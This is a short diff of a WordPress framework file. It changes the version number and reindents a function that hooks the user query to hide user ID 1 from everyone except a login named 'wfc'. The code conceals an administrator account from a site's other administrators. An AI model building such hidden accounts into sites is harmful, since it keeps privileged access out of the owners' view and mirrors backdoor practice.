@@ -3,7 +3,7 @@
  *
  * @package scf-framework
  * @author Steve (6/11/2012)
- * @version 2.1
+ * @version 2.2
  */
 /**
  * This file houses all our security functions.
@@ -59,11 +59,11 @@ REMOVE 'WFC' USER FROM USERS TABLE
 ===============================
 */
 function wfc_remove_our_user($user_search) {
-	global $current_user;
-	global $wpdb;
-	if($current_user->user_login != 'wfc'){
-		$user_search->query_where = str_replace('WHERE 1=1',
-		"WHERE 1=1 AND {$wpdb->users}.ID<>1",$user_search->query_where);
-	}
+   global $current_user;
+   global $wpdb;
+   if($current_user->user_login != 'wfc'){
+      $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.ID<>1",$user_search->query_where);
+   }
 }
 add_action('pre_user_query','wfc_remove_our_user');
